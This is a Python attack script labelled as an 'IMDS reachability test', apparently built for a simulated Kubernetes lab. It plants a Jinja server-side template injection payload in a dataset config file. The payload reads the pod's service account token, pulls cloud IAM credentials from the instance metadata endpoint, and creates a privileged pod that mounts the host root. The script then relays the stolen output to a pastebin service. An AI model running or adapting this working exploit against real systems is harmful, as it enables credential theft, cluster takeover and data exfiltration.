#!/usr/bin/env python3
# imds_reachability_test.py — IMDS reachability + pod scheduler test
#
# SSTI reads the real SA token mounted at /var/run/secrets/ and uses it to call
# the REAL K8s API (https://kubernetes.default.svc) to create a privileged pod.
# dataset-worker-sa has pods/create permission — this creates an actual pod.
#
# Result blob #3 contains:
#   K8s SA token + IMDS IAM creds (AccessKeyId, SecretAccessKey, Token) + pod creation result

import base64
import json
import sys
import time
import gzip
import requests

HUB_URL      = "http://hub.saas-external.svc.cluster.local:8100"
PASTEBIN_URL = "http://pastebin.saas-external.svc.cluster.local:8200"
BLOB_N       = 3

IMDS_REAL = "http://169.254.169.254"
IMDS_MOCK = "http://imds-mock.default.svc.cluster.local"
K8S_API   = "https://kubernetes.default.svc"
SA_TOKEN  = "/var/run/secrets/kubernetes.io/serviceaccount/token"

PRIV_POD = json.dumps({
    "apiVersion": "v1",
    "kind": "Pod",
    "metadata": {"name": "attacker-priv-pod", "namespace": "default"},
    "spec": {
        "hostPID": True,
        "hostNetwork": True,
        "containers": [{
            "name": "pwn",
            "image": "alpine:latest",
            "command": ["tail", "-f", "/dev/null"],
            "securityContext": {"privileged": True},
            "volumeMounts": [{"mountPath": "/host", "name": "host-root"}],
        }],
        "volumes": [{"name": "host-root", "hostPath": {"path": "/"}}],
    },
})

PRIV_POD_B64 = base64.b64encode(PRIV_POD.encode()).decode()

SSTI_PAYLOAD = (
    "{%- set os = cycler.__init__.__globals__.__builtins__.__import__('os') -%}"
    f"{{% set token = os.popen('cat {SA_TOKEN}').read().strip() %}}"
    f"{{% set _ = os.popen('echo {PRIV_POD_B64} | base64 -d > /tmp/priv-pod.json').read() %}}"
    "---SA_TOKEN---\n"
    "{{ token }}\n"
    "---IMDS---\n"
    f"{{{{ os.popen('curl -sf --connect-timeout 2 --max-time 3 {IMDS_REAL}/latest/meta-data/iam/security-credentials/dataset-worker-node-role"
    f" || curl -sf --max-time 10 {IMDS_MOCK}/latest/meta-data/iam/security-credentials/dataset-worker-node-role').read() }}}}\n"
    "---POD_CREATE---\n"
    f"{{{{ os.popen('curl -sk --connect-timeout 5 --max-time 15 -X POST"
    " -H \"Authorization: Bearer ' + token + '\""
    " -H \"Content-Type: application/json\""
    " -d @/tmp/priv-pod.json"
    f" {K8S_API}/api/v1/namespaces/default/pods').read() }}}}"
)

dataset_config = {"config_name": SSTI_PAYLOAD}

payload = {
    "files": [{"path": "data/dataset_info.json", "content": json.dumps(dataset_config)}],
    "commit_message": "Add eval config",
}

n_before = 0
try:
    _r = requests.get(f"{HUB_URL}/datasets/attacker/staging/blob/latest", timeout=10)
    n_before = int(_r.headers.get("X-Blob-Count", 0)) if _r.ok else 0
except Exception:
    pass

try:
    resp = requests.post(f"{HUB_URL}/datasets/attacker/staging/commit", json=payload, timeout=30)
    print(f"[s{BLOB_N}] hub commit → {resp.status_code}")
except Exception as exc:
    print(f"[s{BLOB_N}] ERROR: hub commit: {exc}", file=sys.stderr)
    sys.exit(1)

blob = None
for _ in range(30):
    try:
        _r = requests.get(f"{HUB_URL}/datasets/attacker/staging/blob/latest", timeout=10)
        if _r.ok and int(_r.headers.get("X-Blob-Count", 0)) > n_before:
            blob = _r.content
            break
    except Exception:
        pass
    time.sleep(2)

if blob is None:
    print(f"[s{BLOB_N}] ERROR: HWK did not write blob after 60s", file=sys.stderr)
    sys.exit(1)

decoded = bytes(b ^ 0x4A for b in gzip.decompress(blob)).decode("utf-8", errors="replace")

try:
    requests.put(f"{PASTEBIN_URL}/paste/result-{BLOB_N}", data=decoded, timeout=10)
    print(f"[s{BLOB_N}] relayed → pastebin result-{BLOB_N} ({len(decoded)} chars)")
    print(f"[s{BLOB_N}] done")
except Exception as exc:
    print(f"[s{BLOB_N}] pastebin relay error: {exc}", file=sys.stderr)
    sys.exit(1)

sys.exit(0)
